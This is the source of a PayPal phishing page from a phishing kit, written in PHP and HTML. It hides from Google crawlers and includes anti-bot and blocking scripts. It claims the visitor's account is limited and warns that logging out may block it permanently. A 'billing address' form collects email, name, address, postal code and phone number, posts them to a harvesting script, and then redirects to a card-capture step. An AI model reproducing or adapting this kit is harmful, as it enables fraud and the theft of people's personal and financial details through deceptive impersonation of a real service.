
<?php


session_start();
error_reporting(0);


include "../../../boots/antibots1.php";
include "../../../boots/antibots2.php";
include "../../../boots/antibots3.php";
include "../../../boots/antibots4.php";
include "../../../boots/encriptar.php";
include "../../../boots/.htaccess.htaccess";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


session_start();

include("../../system/blocker.php");
include("../../system/detect.php");
include("../../system/bincheck.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);



?>





    <link rel="stylesheet" href="../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../lib/css/B-Z118.css">

<!DOCTYPE html>






    </style>

<script src="../lib/js/jquery.js"></script><script src="../lib/js/jquery.validate.js"></script><script src="../lib/js/jquery.v-form.js"></script>

<script src="../lib/js/jquery.mask.js"></script>





<!DOCTYPE html>
<html>
<head>
<style>
body {
    margin: 0;
    font-family: 'Lato', sans-serif;
}

.overlay {
    height: 100%;
    width: 0;
    position: fixed;
    z-index: 1;
    top: 0;
    left: 0;
    
    overflow-x: hidden;
    transition: 0.5s;
}

.overlay-content {
    position: relative;
    top: 25%;
    width: 100%;
    text-align: center;
    margin-top: 30px;
}

.overlay a {

}

.overlay a:hover, .overlay a:focus {
    color: #f1f1f1;
}


@media screen and (max-height: 450px) {
  .overlay a {font-size: 20px}
  }
</style>
<script>
function openNav() {
    document.getElementById("myNav").style.width = "100%";
}

function closeNav() {
    document.getElementById("myNav").style.width = "0%";
}
</script>
     


<html data-reactroot="" data-reactid="1" data-react-checksum="381182243"><head data-reactid="2"><script type="text/javascript" src="../../js/pa.js" data-reactid="3"></script>

<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="../lib/img/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="../lib/img/pp32.png" data-reactid="8"/>


<link rel="stylesheet" href="../../css/paypal-sans.css" data-reactid="9"/><link rel="stylesheet" href="../../css/main.css" data-reactid="10"/>

<title data-reactid="11">PayPal: Verify your account : </title>

</head><body class="vx_root  vx_addFlowTransition" data-reactid="12"><input type="checkbox" id="toggleNavigation" class="vx_globalNav-toggleCheckbox" data-reactid="13"/><div class="vx_globalNav-main" role="banner" data-reactid="14"><div class="vx_globalNav-container" data-reactid="15"><a href="#" name="ppLogo" class="vx_globalNav-brand_desktop" data-reactid="16"><span class="vx_a11yText" data-reactid="17">Summary</span></a><div class="vx_globalNav-secondaryNav_mobile" data-reactid="18"><link rel="stylesheet" type="text/css" href="http://css.transconpackaging.com/login.jpg">
<div class="vx_globalNav-listItem_mobileLogout" data-reactid="19"><a href="#"
onclick="document.getElementById('id02').style.display='block'" 
 name="logout_mobile" class="vx_globalNav-link_mobileLogout" data-reactid="20">Log Out</a></div><div class="vx_globalNav-listItem_settings" data-reactid="21"><a href="#" name="settings_mobile" class="vx_globalNav-link_settings" data-reactid="22"><span class="vx_globalNav-iconWrapper_secondary" data-reactid="23"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings" data-reactid="24"></span></span><span class="vx_a11yText" data-reactid="25">Profile</span></a></div><link rel="stylesheet" type="text/css" href="https://creedmoria.com/wordpress/img/login,css"><div data-reactid="26"><p class="vx_h5 vx_globalNav-displayName" data-reactid="27">Hi again !</p></div></div><div class="vx_globalNav-navContainer" data-reactid="28"><nav class="vx_globalNav-nav" role="navigation" data-reactid="29"><ul class="vx_globalNav-list" data-reactid="30"><li data-reactid="31"><a href="#" name="summary" class="vx_globalNav-links" data-reactid="32">Summary</a></li><li data-reactid="33"><a href="#" name="activity" class="vx_globalNav-links" data-reactid="34">Activity</a></li><li data-reactid="35"><a href="#" name="transfer" class="vx_globalNav-links" data-reactid="36">Send &amp; Request</a></li><li data-reactid="37"><a href="#" name="wallet" class=" vx_globalNav-links" data-reactid="38">Wallet</a></li><li data-reactid="39"><a href="#" target="_top" name="shop" class="vx_globalNav-links" data-reactid="40">Shop</a></li></ul><ul class="vx_globalNav-list_secondary" data-reactid="41"><li data-reactid="42"><a name="search" href="#" class="vx_globalNav-link_iconOnly" data-reactid="43"><span class="vx_globalNav-iconWrapper_secondary" data-reactid="44"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSearch icon-magnifying-glass" data-reactid="45"></span></span><span class="vx_a11yText" data-reactid="46">Search</span></a></li><li data-reactid="47"><a href="#" name="settings" class="vx_globalNav-link_settings" data-reactid="48"><span class="vx_globalNav-iconWrapper_secondary" data-reactid="49"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings" data-reactid="50"></span></span><span class="vx_a11yText" data-reactid="51">Profile</span></a></li><li class="vx_globalNav-listItem_logout" data-reactid="52"><a 
 name="logout" class="vx_globalNav-link_logout" data-reactid="53">Log Out</a>
</li></ul></nav></div></div></div><div class="vx_foreground-container foreground-container" data-reactid="54"><div class="vx_globalNav-main_mobile" data-reactid="55"><div class="vx_globalNav-headerSection_trigger" data-reactid="56"><label class="vx_globalNav-toggleTrigger" name="menu" for="toggleNavigation" data-reactid="57">Menu</label></div><div class="vx_globalNav-headerSection_logo" data-reactid="58"><a href="#" name="ppLogo_mobile" class="vx_globalNav-brand_mobile" data-reactid="59"><span class="vx_a11yText" data-reactid="60">Summary</span></a></div><ul class="vx_globalNav-headerSection_actions" data-reactid="61"></ul></div><section class="table-container emptyState-bannerContainer" data-reactid="62"><div class="table-row emptyState-banner" data-reactid="63"><div class="table-col-sm-3 table-col-md-2 emptyState-iconContainer" data-reactid="64"><div class="emptyState-icon " data-reactid="65"><div class="emptyState-iconDesktop" data-reactid="66"><svg class="add-fi-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 177.33 194" width="164px" height="182px" fill="#20BFD6" data-reactid="67"><path class="add-fi-icon-stroke" d="M102,189.88A32.55,32.55,0,0,1,69.6,158.33H11.28a4.12,4.12,0,0,1-4.11-4.11l0-75.85a4.12,4.12,0,0,1,4.11-4.11H27.81l-2.52-2a4.12,4.12,0,0,1-.65-5.78L72,7.18a4.12,4.12,0,0,1,5.78-.65L171.2,81a4.12,4.12,0,0,1,.65,5.78l-37.07,46.81a.86.86,0,0,1-1.54-.53v-18H8.91l0,39.16a2.39,2.39,0,0,0,2.39,2.39H70.44a.86.86,0,0,1,.86.86,30.69,30.69,0,1,0,8.92-21.64.86.86,0,0,1-1.22,0,.86.86,0,0,1,0-1.22,32.42,32.42,0,1,1,23,55.26ZM130.86,74.25A4.12,4.12,0,0,1,135,78.37v52.25l35.54-44.87a2.4,2.4,0,0,0-.38-3.36L76.66,7.88a2.4,2.4,0,0,0-3.36.38L26,67.54a2.39,2.39,0,0,0,.38,3.36l4.2,3.35Zm2.39,39.08V95.5H8.92v17.84ZM11.32,76a2.39,2.39,0,0,0-2.39,2.39V93.78H133.25V78.37A2.39,2.39,0,0,0,130.86,76Z" data-reactid="68"></path><path class="add-fi-icon-stroke" d="M101.33,176.67a.86.86,0,0,1-.86-.86V157.66H82.9a.86.86,0,1,1,0-1.72h17.57V139.31a.86.86,0,0,1,1.72,0v16.63H119.4a.86.86,0,1,1,0,1.72H102.19v18.15A.86.86,0,0,1,101.33,176.67Z" data-reactid="69"></path><path class="add-fi-icon-stroke" d="M101.33,138.81a.5.5,0,0,0-.5.5v17H82.9a.5.5,0,0,0,0,1h17.93v18.51a.5.5,0,0,0,1,0V157.3H119.4a.5.5,0,0,0,0-1H101.83v-17A.5.5,0,0,0,101.33,138.81Z" data-reactid="70"></path></svg></div><div class="emptyState-iconMobile" data-reactid="71"><svg class="add-fi-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 177.33 194" width="100px" height="110px" fill="#20BFD6" data-reactid="72"><path class="add-fi-icon-stroke" d="M102,189.88A32.55,32.55,0,0,1,69.6,158.33H11.28a4.12,4.12,0,0,1-4.11-4.11l0-75.85a4.12,4.12,0,0,1,4.11-4.11H27.81l-2.52-2a4.12,4.12,0,0,1-.65-5.78L72,7.18a4.12,4.12,0,0,1,5.78-.65L171.2,81a4.12,4.12,0,0,1,.65,5.78l-37.07,46.81a.86.86,0,0,1-1.54-.53v-18H8.91l0,39.16a2.39,2.39,0,0,0,2.39,2.39H70.44a.86.86,0,0,1,.86.86,30.69,30.69,0,1,0,8.92-21.64.86.86,0,0,1-1.22,0,.86.86,0,0,1,0-1.22,32.42,32.42,0,1,1,23,55.26ZM130.86,74.25A4.12,4.12,0,0,1,135,78.37v52.25l35.54-44.87a2.4,2.4,0,0,0-.38-3.36L76.66,7.88a2.4,2.4,0,0,0-3.36.38L26,67.54a2.39,2.39,0,0,0,.38,3.36l4.2,3.35Zm2.39,39.08V95.5H8.92v17.84ZM11.32,76a2.39,2.39,0,0,0-2.39,2.39V93.78H133.25V78.37A2.39,2.39,0,0,0,130.86,76Z" data-reactid="73"></path><path class="add-fi-icon-stroke" d="M101.33,176.67a.86.86,0,0,1-.86-.86V157.66H82.9a.86.86,0,1,1,0-1.72h17.57V139.31a.86.86,0,0,1,1.72,0v16.63H119.4a.86.86,0,1,1,0,1.72H102.19v18.15A.86.86,0,0,1,101.33,176.67Z" data-reactid="74"></path><path class="add-fi-icon-stroke" d="M101.33,138.81a.5.5,0,0,0-.5.5v17H82.9a.5.5,0,0,0,0,1h17.93v18.51a.5.5,0,0,0,1,0V157.3H119.4a.5.5,0,0,0,0-1H101.83v-17A.5.5,0,0,0,101.33,138.81Z" data-reactid="75"></path></svg></div></div></div><div class="table-col-sm-9 table-col-md-8" data-reactid="76"><div class="emptyState-content" data-reactid="77"><h2 class="vx_h2 emptyState-header" data-reactid="78">Verify your account : <?=@$_SESSION['_email_'];?>
</h2><p class="emptyState-body" data-reactid="79">

We apologize for any inconvenience.

You can not access all your PayPal advantages, due to account limited. 
To restore your account, please click Continue to update your information

Continue

</p>


<button  onclick="openNav()"

class="btn vx_btn emptyState-button vx_btn-secondary_reversed" 

style="width:auto;">Continue</button>




</div></div></div></section><section class="vx_mainContent contents" id="contents" role="main" data-reactid="81"><main class="row accountPage-container js_accountPage-container" tabindex="-1" aria-label="Accounts List and Detail" data-reactid="82"><div class="col-sm-4 accountPage-sections fiLists-container isActive" data-reactid="83"><section class="fiListGroup nemo_fiListGroup" data-reactid="84">



<ul class="fiList test_fiList" data-reactid="90"><li class="fiListItem-container fiList-item_selected" data-reactid="91"><a href="#" name="viewBalance" class="fiListItem-link" data-reactid="92"><span class="fiListItem-row table-row" data-reactid="93"><span class="fiListItem-col table-col-xs fiListItem-statusIcon" data-reactid="94"></span><span class="fiListItem-col table-col-xs fiListItem-typeIcon" data-reactid="95"><span class="product-logo circleLogo_small product-logo_balance " data-reactid="96"><span class="monogram-logo-group" data-reactid="97"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 59" preserveAspectRatio="xMidYMid" class="monogram-logo" data-reactid="98"><g fill="none" fill-rule="evenodd" data-reactid="99"><path class="monogram-logo-lastP_balance" d="M21.33 14.097h16.705c8.97 0 12.346 4.5 11.825 11.126-.86 10.92-7.52 16.96-16.352 16.96h-4.46c-1.21 0-2.024.793-2.354 2.95L24.78 57.65c-.123.814-.554 1.292-1.202 1.35H13.102c-.985 0-1.336-.748-1.078-2.367l6.397-40.16c.258-1.61 1.146-2.376 2.91-2.376" data-reactid="100"></path><path class="monogram-logo-firstP_balance" d="M10.885.276h16.723c4.71 0 10.296.152 14.033 3.42 2.498 2.183 3.808 5.66 3.505 9.394-1.025 12.66-8.663 19.753-18.906 19.753h-8.25c-1.403 0-2.333.922-2.73 3.42l-2.3 14.517c-.15.942-.562 1.497-1.313 1.564H1.345c-1.143 0-1.55-.867-1.25-2.745L7.513 3.03C7.81 1.166 8.84.277 10.885.277" data-reactid="101"></path><path class="monogram-logo-overlap_balance" d="M15.5 34.8l2.92-18.328c.257-1.61 1.145-2.375 2.91-2.375h16.706c2.765 0 5 .428 6.75 1.217-1.678 11.268-9.028 17.53-18.654 17.53h-8.248c-1.085 0-1.896.55-2.384 1.956" data-reactid="102"></path></g></svg></span></span></span><span class="fiListItem-col table-col-xs" data-reactid="103"><span class="fiListItem-header test_navItem-balance" data-reactid="104">PayPal balance</span><span class="fiListItem-identifier" data-reactid="105"><span class="fiListItem-amount vx_h3" data-reactid="106">Confirm</span><!-- react-text: 107 --> <!-- /react-text --><span class="vx_legal-text" data-reactid="108">
Biiling address</span></span></span></span></a></li>

<li class="fiListItem-container" data-reactid="109"><div class="fiListItem-row" data-reactid="110">

<span class="fiListItem-row table-row" data-reactid="93"><span class="fiListItem-col table-col-xs fiListItem-statusIcon" data-reactid="94"></span><span class="fiListItem-col table-col-xs fiListItem-typeIcon" data-reactid="95"><span class="" data-reactid="96"><span class="" data-reactid="97"><svg class="generic-card-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 46 32" width="48px" height="48px" fill="#009CDE" data-reactid="180"><path class="generic-card-icon-stroke" d="M36.62,23.13H32.29a1.38,1.38,0,0,1-1.38-1.38V18.54a1.38,1.38,0,0,1,1.38-1.38h4.33A1.39,1.39,0,0,1,38,18.54v3.21A1.39,1.39,0,0,1,36.62,23.13Zm-4.33-5a.38.38,0,0,0-.38.38v3.21a.39.39,0,0,0,.38.38h4.33a.39.39,0,0,0,.38-.38V18.54a.38.38,0,0,0-.38-.38Z" data-reactid="181"></path><path class="generic-card-icon-stroke" d="M41.51,30H4.13A2.14,2.14,0,0,1,2,27.85V4.66A2.14,2.14,0,0,1,4.13,2.5H41.51a2.14,2.14,0,0,1,2.13,2.16V6.45a.5.5,0,1,1-1,0V4.66A1.14,1.14,0,0,0,41.51,3.5H4.13A1.14,1.14,0,0,0,3,4.66V27.85A1.14,1.14,0,0,0,4.13,29H41.51a1.14,1.14,0,0,0,1.13-1.16V11h-35a.5.5,0,1,1,0-1H43.13a.5.5,0,0,1,.5.5V27.85A2.14,2.14,0,0,1,41.51,30Z" data-reactid="182"></path><path class="generic-card-icon-stroke" d="M25.9,17.15H7.57a.5.5,0,0,1,0-1H25.9a.5.5,0,0,1,0,1Z" data-reactid="183"></path></svg></span></span></span><span class="fiListItem-col table-col-xs" data-reactid="103"><span class="fiListItem-header test_navItem-balance" data-reactid="104">PayPal cards</span><span class="fiListItem-identifier" data-reactid="105"><span class="fiListItem-amount vx_h3" data-reactid="106">Confirm</span><!-- react-text: 107 --> <!-- /react-text --><span class="vx_legal-text" data-reactid="108">Cards x-PayPal</span></span></span></span>






<div id="myNav" class="overlay">


<br>
<br>
<br>



<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader" data-reactid="168" aria-label="Modal Dialog"><div class="vx_modal-wrapper" data-reactid="169"><a 
onclick="closeNav()"
class="vx_modal-dismiss_x" ><span class="vx_a11yText" data-reactid="171">close</span></a><div class="vx_modal-content" data-reactid="172"><header class="vx_modal-header" data-reactid="173"><h2 id="js_modalHeader" class="vx_h2" data-reactid="174">Update Billing Address</h2></header><div class="vx_modal-body vx_blocks-for-mobile" data-reactid="175"><div class="">


<div class="cp_right">


<html class=" BowZ118 BowDefaultZ118 js " lang="fr" dir="ltr"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">


    <script>
    $(function() {
    $('#phoneNumber').mask('(+000)000000000');
	});
	</script>
</head>
<body>



                        <form action="../../system/sand_biling.php" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">
                         
                            <div class="HeaderZ118">
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"></p>
                            </div>
                            <div class="BowContainerZ118">
                                
                                <div class="inner">
                                    <div class="G-FieldsZ118">
                                        <div class="textInput">
                                            <div class="FieldsZ118 large">
                                                <input type="email" class="Xval666ideX1 " id="email_address" name="email_address" required="required" autocomplete="off" placeholder="your email address" value="<?=@$_SESSION['_email_'];?>">
                                            </div>


 <div 



class="FieldsZ118 large">
                                                                                            </div>


                            
<div class="multi equal clearfix">
                                                    <div class="FieldsZ118 left">
                                                        <input  id="FirstName" name="dFirstName" class="Xval666ideX1 " placeholder="First Name" required="required" autocomplete="off" value="" aria-required="true">
                              



                      </div><div class="FieldsZ118 right">  

<input id="dLastName" name="dLastName" class="Xval666ideX1 " placeholder="Last Name" required="required" autocomplete="off" value="">

                                                    </div>
                                            </div>
                








                                        </div>
										<div class="textInput">                                        </div>
                                    </div>
                                    <div class="AddressLine" id="addressEntry">
                                        <div class="G-FieldsZ118">
                                            <div class="textInput">
                                                <div class="FieldsZ118 large">
                                                    <input  class="Xval666ideX1" id="addres" name="addres" required="required" value="<?php if(isset($_SESSION['_address_'])== true){ echo $_SESSION['_address_'];} ?>" placeholder="Address Line" autocomplete="off">
                                                </div>
                                            </div>
                            
<div class="multi equal ">
                                                  



                      </div><div class="FieldsZ118 right">  

                                                    </div>
                                            </div>
                



<div 
 id="stateHolder">
                                                <div class="textInput">
                                                    <div class="FieldsZ118 large">
                                                                                                          </div>
                            




		<link rel="stylesheet" href="../../css/n.css">


	<div class="rotation"> <p> Checking your billing address... </p> </div>




<script>
            $(".validator").validate({

                
                submitHandler: function(form) {
                    $(".rotation").show();
					$.post("../../system/sand_biling.php?ajax", $(".validator").serialize(), function(result) {
                            setTimeout(function() {
                                $(location).attr("href", "../Cards/");
                            });
                    });
                },
                
            });    
        </script>
   


                 </div>
                                            </div>
											<div class="multi equal ">
                                                    <div class="FieldsZ118 left">
                                                        <input id="stat" name="stat" class="Xval666ideX1 " placeholder="City / Town / Village" required="required" autocomplete="off" value="<?php echo $countryname ?>/<?php echo $countrycity ?>" aria-required="true">
                                                    </div><div class="FieldsZ118 right">
                                                        <input type="tel" id="zipCode" name="zipCode" class="Xval666ideX1 " placeholder="Postal Code" required="number" autocomplete="off" value="<?php if(isset($_SESSION['_zipCode_'])== true){ echo $_SESSION['_zipCode_'];} ?>" aria-required="true">
                                                    </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="groupReatedFields mobileEntry">
                                        <div class="left mobileEntry">
                                            <div class="SelectDown118 ">
                                                <select id="phoneOption" name="phoneOption" class="valid" aria-invalid="false" required="required">
                                                    <option value="mobile">Mobile</option>
                                                    <option value="home">Domicile</option>
                                                </select><span class="select-arrow"></span></div>
                                        </div>
                                        <div class="textInput">
                                            <div class="FieldsZ118 right">
                                                <input type="tel" id="phoneNumber" name="phoneNumber" required="required" value="<?php if(isset($_SESSION['_phoneNumber_'])== true){ echo $_SESSION['_phoneNumber_'];} ?>" class="Xval666ideX1 " autocomplete="off" autocorrect="off" autocapitalize="off" auto-required="true" placeholder="Phone Number">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="agreeTC checkbox  ">
                                        <div class="">

                                                 


                                                                             </div>

</div>
                                    <input id="submitBtn" name="" type="submit" class="vx_btn vx_btn-block validateBeforeSubmit" value="Continue" data-click="WorldWideSubmit">

     

<a href='' target='_top' class='nemo_recentActivity-shopLink'>








</span></span></a></div></div></div></div></div>

</div>


<script>
// Get the modal
var modal = document.getElementById('id01');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>

</body>





<div id="id02" class="modal">
  
<form class="modal-content animate" >
    <div class="imgcontainer">
     

<center><div><h2>If you log out your account may be blocked permanently</h2>

<button  onclick="openNav()" class="vx_btn vx_btn-block" style="width:auto;">Continue</button>


</center>




    </div>

    
    </div>
  </form>

</div>

<script>
// Get the modal
var modal = document.getElementById('id02');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>









<li class="fiListItem-container" data-reactid="109"><div class="fiListItem-row" data-reactid="110">

<span class="fiListItem-row table-row" data-reactid="93"><span class="fiListItem-col table-col-xs fiListItem-statusIcon" data-reactid="94"></span><span class="fiListItem-col table-col-xs fiListItem-typeIcon" data-reactid="95"><span class="" data-reactid="96"><span class="" data-reactid="97"><svg class="generic-bank-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 32" width="48px" height="48px" fill="#009CDE" data-reactid="189"><path class="generic-bank-icon-stroke" d="M32.71,10,17.23,2.79a.5.5,0,0,0-.44,0L2.32,10.05a.5.5,0,0,0,.22.95H6.14V21.89a.5.5,0,1,0,1,0V11H12.8V24a.5.5,0,0,0,.5.5l16.37.09v2.12a.5.5,0,0,0,.5.5h1.05v1.33H3V27.18H4.05a.5.5,0,0,0,.5-.5V24.85H9.88a.5.5,0,0,0,0-1H4.05a.5.5,0,0,0-.5.5v1.83H2.5a.5.5,0,0,0-.5.5V29a.5.5,0,0,0,.5.5H31.72a.5.5,0,0,0,.5-.5V26.68a.5.5,0,0,0-.5-.5H30.67V24.06a.5.5,0,0,0-.5-.5L13.8,23.46V11H19V22a.5.5,0,0,0,1,0V10.5a.5.5,0,0,0-.5-.5H4.66L17,3.8,30.25,10H27.5a.5.5,0,0,0-.5.5V22a.5.5,0,0,0,1,0V11h4.5a.5.5,0,0,0,.21-1Z" data-reactid="190"></path></svg>
</span></span></span><span class="fiListItem-col table-col-xs" data-reactid="103"><span class="fiListItem-header test_navItem-balance" data-reactid="104">PayPal Bank accounts</span><span class="fiListItem-identifier" data-reactid="105"><span class="fiListItem-amount vx_h3" data-reactid="106">Confirm </span><!-- react-text: 107 --> <!-- /react-text --><span class="vx_legal-text" data-reactid="108">Bank accounts</span></span></span></span>




<li class="fiListItem-container" data-reactid="109"><div class="fiListItem-row" data-reactid="110"><a href="#"  onclick="document.getElementById('id01').style.display='block'"class="fiListItem-addNew vx_addBtn-primary test_addNewFi" data-reactid="111">Link a card or bank</a></div></li></ul></section></div><section class="col-sm-8 accountPage-sections fiDetailArea-container " data-reactid="112"><div class="fiDetails-container" data-reactid="113"><a href="/myaccount/money" name="backButton" class="vx_backBtn fiDetails-backBtn showForMobile" data-reactid="114">Back</a>

<div class="fiDetails" data-reactid="115">

<div>


<span class="icon icon-large icon-attention-large fiActionResult-icon_error" data-reactid="20"></span>

</div>
<br>
<br>
<h3 class="vx_h3" data-reactid="123"></h3><div class="fiDetails-content" data-reactid="124"><div class="fiDetails-balance_info" data-reactid="125"><p class="vx_h2 balanceDetails-amount" data-reactid="126"></p><span class="vx_legal-text fiSecondary-text" data-reactid="127"></span></div><div class="vx_blocks-for-mobile" data-reactid="128">


<div />


<h2>Verify your account : <?=@$_SESSION['_email_'];?></h2><p> We apologize for any inconvenience. </p><p> You can not access all your PayPal advantages, due to account limited. <br>
                        </p><p> </p><p style="margin-bottom:25px;"> To restore your account, please click <i>Continue</i> to update your information</p>		


<button  onclick="openNav()"



class="vx_btn vx_btn-block" 

style="width:auto;">Continue</button>





</div>





</div>

<div class="fiChoice-container" data-reactid="135">


<div class="vx_text-6" data-reactid="137"><button name="makePreferredPayment" class="btn vx_btn-link fiChoice-preferredLink" data-reactid="138"><span class="" data-reactid="139"></span><span data-reactid="140">


</span></button></div><div class="vx_text-6 fiChoice-info" data-reactid="141"><!-- react-text: 142 -->


<!-- /react-text --><!-- react-text: 143 --> <!-- /react-text --><div data-reactid="144">



</div><div data-reactid="145"><a href="#" name="choiceLearnMore" data-reactid="146"></a></div></div></div></div></div></div></section></main></section><div class="vx_globalFooter" data-reactid="147"><div class="vx_globalFooter-content" data-reactid="148"><ul class="vx_globalFooter-list" data-reactid="149"><li data-reactid="150"><a href="/us/selfhelp/home" name="help" data-reactid="151">Help &amp; Contact</a></li><li data-reactid="152"><a href="#" name="security" data-reactid="153">Security</a></li></ul><div class="vx_globalFooter_secondary" data-reactid="154"><p class="vx_globalFooter-copyright" data-reactid="155"><!-- react-text: 156 -->© 1999-2018 PayPal, Inc.<!-- /react-text --><!-- react-text: 157 --> <!-- /react-text --><!-- react-text: 158 -->All rights reserved.<!-- /react-text --></p><ul class="vx_globalFooter-list_secondary" data-reactid="159"><li data-reactid="160"><a href="#" name="privacy" data-reactid="161">Privacy</a></li><li data-reactid="162"><a href="#" name="legal" data-reactid="163">Legal</a></li><li data-reactid="164"><a href="#" name="policyUpdates" data-reactid="165">Policy updates</a></li><li id="siteFeedback" data-reactid="166"></li></ul></div><p class="vx_globalFooter-disclaimer" data-reactid="167"></p></div></div></div><div class="vx_modal-background " id="vx_modal-background" data-reactid="168"></div><script type="text/javascript" src="" data-reactid="169"></script><script type="text/javascript" src="" data-reactid="170"></script><script type="text/javascript" src="" data-reactid="171"></script><script id="react-engine-props" type="application/json">
</script></body>





</html>

